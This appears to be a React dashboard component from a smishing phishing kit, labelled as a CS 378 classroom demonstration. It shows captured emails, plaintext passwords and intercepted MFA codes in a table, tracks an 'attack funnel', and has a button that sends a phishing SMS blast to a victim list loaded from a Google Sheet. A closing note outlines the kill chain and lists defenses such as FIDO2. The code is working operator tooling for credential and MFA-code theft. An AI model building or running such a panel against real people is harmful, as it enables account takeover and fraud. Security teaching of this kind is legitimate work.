import { useState, useEffect } from 'react';
import { getAnalytics, resetData, sendBlast, refreshSheet } from '../api';

interface Submission {
  email: string;
  password: string;
  name: string;
  phone: string;
  mfaCode: string | null;
  timestamp: string;
  userAgent: string;
}

interface Victim {
  name: string;
  email: string;
  maskedPhone: string;
}

interface AnalyticsData {
  analytics: {
    totalVisits: number;
    signInViews: number;
    passwordViews: number;
    mfaViews: number;
    credentialsCaptured: number;
    mfaCodesEntered: number;
    redirectsCompleted: number;
    smsSent: number;
  };
  submissions: Submission[];
  victims: Victim[];
}

export function Dashboard() {
  const [data, setData] = useState<AnalyticsData | null>(null);
  const [error, setError] = useState('');
  const [showPasswords, setShowPasswords] = useState(false);
  const [blastStatus, setBlastStatus] = useState<string | null>(null);
  const [isSending, setIsSending] = useState(false);

  const fetchData = async () => {
    try {
      const result = await getAnalytics();
      setData(result);
      setError('');
    } catch {
      setError('Could not connect to backend. Make sure the server is running on port 3001.');
    }
  };

  useEffect(() => {
    fetchData();
    const interval = setInterval(fetchData, 5000);
    return () => clearInterval(interval);
  }, []);

  const handleReset = async () => {
    if (window.confirm('Reset all captured data? This cannot be undone.')) {
      await resetData();
      fetchData();
    }
  };

  const handleBlast = async () => {
    if (!window.confirm(`Send phishing SMS to ALL ${data?.victims?.length || 0} victims from the Google Sheet?`)) return;
    setIsSending(true);
    setBlastStatus('Sending...');
    try {
      const result = await sendBlast();
      const sent = result.results?.filter((r: { status: string }) => r.status === 'sent').length || 0;
      const failed = result.results?.filter((r: { status: string }) => r.status === 'failed').length || 0;
      setBlastStatus(`Done! ${sent} sent, ${failed} failed`);
    } catch {
      setBlastStatus('Failed to send blast');
    }
    setIsSending(false);
    fetchData();
  };

  const handleRefresh = async () => {
    const result = await refreshSheet();
    setBlastStatus(`Sheet refreshed: ${result.count} victims loaded`);
    fetchData();
  };

  if (error) {
    return (
      <div style={{ minHeight: '100vh', backgroundColor: '#0a0a0a', color: '#fff', padding: '32px', fontFamily: 'system-ui' }}>
        <h1 style={{ fontSize: '24px', color: '#f87171', marginBottom: '16px' }}>Backend Not Connected</h1>
        <p style={{ color: '#999', marginBottom: '16px' }}>{error}</p>
        <code style={{ display: 'block', backgroundColor: '#1a1a1a', padding: '16px', borderRadius: '8px', color: '#9ca3af' }}>
          cd server && npm install && npm run dev
        </code>
      </div>
    );
  }

  if (!data) {
    return (
      <div style={{ minHeight: '100vh', backgroundColor: '#0a0a0a', color: '#999', display: 'flex', alignItems: 'center', justifyContent: 'center', fontFamily: 'system-ui' }}>
        Loading analytics...
      </div>
    );
  }

  const { analytics, submissions, victims } = data;

  const funnelSteps = [
    { label: 'SMS Sent', count: analytics.smsSent, color: '#3b82f6' },
    { label: 'Visited Link', count: analytics.totalVisits, color: '#6366f1' },
    { label: 'Entered Password', count: analytics.credentialsCaptured, color: '#a855f7' },
    { label: 'MFA Page', count: analytics.mfaViews, color: '#ec4899' },
    { label: 'Completed', count: analytics.redirectsCompleted, color: '#ef4444' },
  ];
  const maxCount = Math.max(...funnelSteps.map(s => s.count), 1);

  return (
    <div style={{ minHeight: '100vh', backgroundColor: '#0a0a0a', color: '#fff', fontFamily: 'system-ui' }}>
      {/* Header */}
      <div style={{ borderBottom: '1px solid #222', padding: '20px 32px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div>
          <h1 style={{ fontSize: '20px', fontWeight: 700, margin: 0 }}>Phishing Demo — Attacker Dashboard</h1>
          <p style={{ fontSize: '12px', color: '#666', margin: '4px 0 0' }}>CS 378 Educational Demonstration — Auto-refreshes every 5s</p>
        </div>
        <div style={{ display: 'flex', gap: '8px' }}>
          <button onClick={fetchData} style={{ padding: '6px 16px', backgroundColor: '#1a1a1a', color: '#fff', border: '1px solid #333', borderRadius: '4px', cursor: 'pointer', fontSize: '13px' }}>Refresh</button>
          <button onClick={handleReset} style={{ padding: '6px 16px', backgroundColor: '#450a0a', color: '#fca5a5', border: '1px solid #7f1d1d', borderRadius: '4px', cursor: 'pointer', fontSize: '13px' }}>Reset</button>
        </div>
      </div>

      <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '24px 32px', display: 'flex', flexDirection: 'column', gap: '24px' }}>

        {/* SMS Blast Panel */}
        <div style={{ backgroundColor: '#0c1a2e', border: '1px solid #1e3a5f', borderRadius: '12px', padding: '24px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
            <div>
              <h2 style={{ fontSize: '16px', fontWeight: 600, margin: 0, color: '#60a5fa' }}>SMS Phishing Blast</h2>
              <p style={{ fontSize: '13px', color: '#6b7280', margin: '4px 0 0' }}>
                {victims.length} victims loaded from Google Sheet
              </p>
            </div>
            <div style={{ display: 'flex', gap: '8px' }}>
              <button onClick={handleRefresh} style={{ padding: '6px 16px', backgroundColor: '#1a1a2e', color: '#93c5fd', border: '1px solid #1e3a5f', borderRadius: '4px', cursor: 'pointer', fontSize: '13px' }}>
                Reload Sheet
              </button>
              <button
                onClick={handleBlast}
                disabled={isSending || victims.length === 0}
                style={{
                  padding: '6px 20px', backgroundColor: isSending ? '#1a1a2e' : '#dc2626', color: '#fff',
                  border: 'none', borderRadius: '4px', cursor: isSending ? 'default' : 'pointer', fontSize: '13px', fontWeight: 600,
                  opacity: isSending || victims.length === 0 ? 0.5 : 1,
                }}
              >
                {isSending ? 'Sending...' : `Send SMS to All (${victims.length})`}
              </button>
            </div>
          </div>
          {blastStatus && (
            <div style={{ fontSize: '13px', color: '#86efac', backgroundColor: '#052e16', padding: '8px 12px', borderRadius: '4px' }}>
              {blastStatus}
            </div>
          )}
          {victims.length > 0 && (
            <div style={{ marginTop: '12px', display: 'flex', flexWrap: 'wrap', gap: '8px' }}>
              {victims.map((v, i) => (
                <span key={i} style={{ fontSize: '12px', backgroundColor: '#1a1a2e', padding: '4px 10px', borderRadius: '12px', color: '#93c5fd' }}>
                  {v.name || v.email} ({v.maskedPhone})
                </span>
              ))}
            </div>
          )}
        </div>

        {/* Stats */}
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '12px' }}>
          <StatCard label="SMS Sent" value={analytics.smsSent} icon="📤" />
          <StatCard label="Credentials Captured" value={analytics.credentialsCaptured} icon="🔑" accent />
          <StatCard label="MFA Codes" value={analytics.mfaCodesEntered} icon="📱" />
          <StatCard label="Success Rate" value={analytics.totalVisits > 0 ? `${Math.round((analytics.credentialsCaptured / analytics.totalVisits) * 100)}%` : '0%'} icon="📊" />
        </div>

        {/* Funnel */}
        <div style={{ backgroundColor: '#111', borderRadius: '12px', padding: '24px' }}>
          <h2 style={{ fontSize: '16px', fontWeight: 600, marginBottom: '16px' }}>Attack Funnel</h2>
          <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
            {funnelSteps.map((step, i) => (
              <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
                <div style={{ width: '140px', textAlign: 'right', fontSize: '13px', color: '#888' }}>{step.label}</div>
                <div style={{ flex: 1, backgroundColor: '#1a1a1a', borderRadius: '999px', height: '28px', overflow: 'hidden' }}>
                  <div style={{
                    backgroundColor: step.color, height: '100%', borderRadius: '999px',
                    width: `${Math.max((step.count / maxCount) * 100, 4)}%`,
                    display: 'flex', alignItems: 'center', justifyContent: 'flex-end', paddingRight: '10px',
                    transition: 'width 0.5s',
                  }}>
                    <span style={{ fontSize: '12px', fontWeight: 700 }}>{step.count}</span>
                  </div>
                </div>
                {i > 0 && funnelSteps[i - 1].count > 0 && (
                  <div style={{ width: '48px', fontSize: '12px', color: '#666', textAlign: 'right' }}>
                    {Math.round((step.count / funnelSteps[i - 1].count) * 100)}%
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>

        {/* Captured Credentials */}
        <div style={{ backgroundColor: '#111', borderRadius: '12px', padding: '24px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
            <h2 style={{ fontSize: '16px', fontWeight: 600, margin: 0 }}>Captured Credentials ({submissions.length})</h2>
            <button onClick={() => setShowPasswords(!showPasswords)} style={{ fontSize: '13px', color: '#888', background: 'none', border: 'none', cursor: 'pointer' }}>
              {showPasswords ? 'Hide' : 'Show'} passwords
            </button>
          </div>
          {submissions.length === 0 ? (
            <p style={{ color: '#555', textAlign: 'center', padding: '32px 0' }}>No credentials captured yet. Waiting for victims...</p>
          ) : (
            <div style={{ overflowX: 'auto' }}>
              <table style={{ width: '100%', fontSize: '13px', borderCollapse: 'collapse' }}>
                <thead>
                  <tr style={{ borderBottom: '1px solid #222', color: '#666' }}>
                    <th style={{ textAlign: 'left', padding: '8px' }}>#</th>
                    <th style={{ textAlign: 'left', padding: '8px' }}>Name</th>
                    <th style={{ textAlign: 'left', padding: '8px' }}>Email</th>
                    <th style={{ textAlign: 'left', padding: '8px' }}>Password</th>
                    <th style={{ textAlign: 'left', padding: '8px' }}>MFA Code</th>
                    <th style={{ textAlign: 'left', padding: '8px' }}>Time</th>
                  </tr>
                </thead>
                <tbody>
                  {submissions.map((sub, i) => (
                    <tr key={i} style={{ borderBottom: '1px solid #1a1a1a' }}>
                      <td style={{ padding: '8px', color: '#555' }}>{i + 1}</td>
                      <td style={{ padding: '8px', color: '#d1d5db' }}>{sub.name || '—'}</td>
                      <td style={{ padding: '8px', color: '#4ade80', fontFamily: 'monospace' }}>{sub.email}</td>
                      <td style={{ padding: '8px', fontFamily: 'monospace' }}>
                        {showPasswords ? <span style={{ color: '#f87171' }}>{sub.password}</span> : <span style={{ color: '#444' }}>••••••••</span>}
                      </td>
                      <td style={{ padding: '8px', fontFamily: 'monospace' }}>
                        {sub.mfaCode ? <span style={{ color: '#facc15' }}>{sub.mfaCode}</span> : <span style={{ color: '#444' }}>—</span>}
                      </td>
                      <td style={{ padding: '8px', color: '#666' }}>{new Date(sub.timestamp).toLocaleString()}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>

        {/* Educational Note */}
        <div style={{ backgroundColor: '#1c1407', border: '1px solid #854d0e', borderRadius: '12px', padding: '20px' }}>
          <h3 style={{ color: '#fbbf24', fontWeight: 600, fontSize: '14px', marginBottom: '8px' }}>Educational Purpose Only</h3>
          <p style={{ fontSize: '13px', color: '#d4a574', lineHeight: '1.5' }}>
            This dashboard demonstrates what an attacker sees after deploying a phishing kit with smishing (SMS phishing).
            The full kill chain: Google Form collects contact info → Twilio sends urgent SMS with phishing link →
            Fake SSO captures credentials → Real MFA codes intercepted in real-time → Victim redirected to real site.
            Defenses: FIDO2/WebAuthn, phishing-resistant MFA, URL inspection, SMS sender verification.
          </p>
        </div>
      </div>
    </div>
  );
}

function StatCard({ label, value, icon, accent }: { label: string; value: number | string; icon: string; accent?: boolean }) {
  return (
    <div style={{ backgroundColor: accent ? '#1a0a0a' : '#111', border: `1px solid ${accent ? '#7f1d1d' : '#222'}`, borderRadius: '12px', padding: '20px' }}>
      <div style={{ fontSize: '20px', marginBottom: '8px' }}>{icon}</div>
      <div style={{ fontSize: '28px', fontWeight: 700, color: accent ? '#f87171' : '#fff' }}>{value}</div>
      <div style={{ fontSize: '13px', color: '#666', marginTop: '4px' }}>{label}</div>
    </div>
  );
}
